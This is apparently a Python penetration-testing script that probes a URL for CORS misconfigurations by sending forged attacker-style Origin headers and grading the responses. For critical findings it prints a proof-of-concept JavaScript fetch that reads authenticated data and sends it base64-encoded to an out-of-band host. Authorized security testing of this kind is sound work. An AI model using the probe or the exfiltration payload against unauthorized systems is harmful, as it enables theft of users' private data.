#!/usr/bin/env python3
"""cors_probe.py — original, owned CORS misconfiguration probe for pen_test.

Deeper than http_recon.py's single reflected-origin check: it fires a battery
of Origin variants (arbitrary, null, subdomain, prefix/suffix, pre-domain,
not-quite-suffix) and, crucially, reports whether the response ALSO sets
`Access-Control-Allow-Credentials: true` — which is what turns an over-broad
CORS policy into an authenticated cross-origin data read.

Runs through the shared _httpcore engine, so it carries a real authenticated
session (-H/-b/--bearer) — CORS on an endpoint that returns YOUR data only
matters once the request is authenticated.

AUTHORIZATION: sends real requests. Authorized targets only — see
agents/pen_test.md's authorization gate.

    python3 cors_probe.py -u https://api.target/me
    python3 cors_probe.py -u https://api.target/me --bearer "$TOKEN"
"""

from __future__ import annotations

import argparse
from urllib.parse import urlparse

import _httpcore as core

ACAO = "access-control-allow-origin"
ACAC = "access-control-allow-credentials"


def _h(headers: dict, name: str) -> str | None:
    """Case-insensitive response-header lookup."""
    name = name.lower()
    for k, v in headers.items():
        if k.lower() == name:
            return v
    return None


def origin_variants(url: str) -> list[tuple[str, str]]:
    """(label, Origin) pairs derived from the target host."""
    host = urlparse(url).hostname or "target"
    apex = ".".join(host.split(".")[-2:]) if host.count(".") >= 1 else host
    return [
        ("arbitrary",         "https://evil.example"),
        ("null",              "null"),
        ("subdomain-of-apex", f"https://evil.{apex}"),
        ("prefix-of-host",    f"https://{host}.evil.example"),
        ("host-as-subdomain", f"https://evil-{host}"),
        ("suffix-not-dot",    f"https://not{host}"),          # host as bare suffix
        ("pre-domain",        f"https://{host}.attacker.example"),
        ("http-downgrade",    f"http://{host}"),
    ]


def evaluate(sent_origin: str, acao: str | None, acac: str | None) -> tuple[str, str]:
    """Return (severity, why) for one origin's response."""
    if acao is None:
        return ("none", "no ACAO returned — not reflected")
    creds = (acac or "").strip().lower() == "true"
    reflected = acao.strip() == sent_origin or (sent_origin == "null" and acao.strip().lower() == "null")
    wildcard = acao.strip() == "*"
    if reflected and creds:
        return ("CRITICAL", f"reflects Origin {sent_origin!r} AND allows credentials — authenticated cross-origin read")
    if reflected and not creds:
        return ("medium", f"reflects Origin {sent_origin!r} without credentials — readable only if endpoint needs no auth cookie")
    if wildcard and creds:
        # browsers reject *+credentials, but some stacks send it and a few clients honor it
        return ("high", "ACAO:* with credentials:true — spec-illegal but a real leak on lenient clients")
    if wildcard:
        return ("low", "ACAO:* — public data only; not a finding if the endpoint is meant to be public")
    return ("info", f"ACAO fixed to {acao!r} — not reflecting our Origin (good)")


SEV_ORDER = {"CRITICAL": 0, "high": 1, "medium": 2, "low": 3, "info": 4, "none": 5}


def run(args) -> None:
    client = core.client_from_args(args)
    core.require_scheme(args.url)
    print(f"CORS probe: {args.url}")
    print("(authenticated)" if (args.bearer or args.header or args.cookie) else "(unauthenticated — add --bearer/-H/-b to test authed data)")
    print("-" * 72)

    worst = "none"
    rows = []
    for label, origin in origin_variants(args.url):
        r = client.request("GET", args.url, headers={"Origin": origin})
        if not r.ok:
            rows.append((label, origin, "error", r.error, "none"))
            continue
        acao = _h(r.headers, ACAO)
        acac = _h(r.headers, ACAC)
        sev, why = evaluate(origin, acao, acac)
        rows.append((label, origin, sev, why, sev))
        if SEV_ORDER[sev] < SEV_ORDER[worst]:
            worst = sev

    rows.sort(key=lambda row: SEV_ORDER.get(row[4], 9))
    for label, origin, sev, why, _ in rows:
        tag = f"[{sev}]"
        print(f"  {tag:11s} {label:18s} Origin={origin}")
        print(f"              {why}")

    print("\n" + "=" * 72)
    if worst in ("CRITICAL", "high"):
        print(f"[!] CORS FINDING ({worst}). Confirm with a real cross-origin read:")
        print("    Host a page on an attacker origin that does:")
        print(f"      fetch('{args.url}', {{credentials:'include'}}).then(r=>r.text()).then(t=>fetch('//<oob>/?'+btoa(t)))")
        print("    A finding is another user's data actually exfiltrated cross-origin — see knowledge/web_infra.md.")
    elif worst in ("medium", "low"):
        print(f"[?] Permissive CORS ({worst}) but no credentialed leak — confirm the endpoint isn't public-by-design.")
    else:
        print("[-] No reflecting CORS policy observed on this endpoint.")


def main() -> None:
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("-u", "--url", required=True, help="endpoint to test (ideally one that returns user data)")
    core.add_common_args(p)
    args = p.parse_args()
    run(args)


if __name__ == "__main__":
    main()
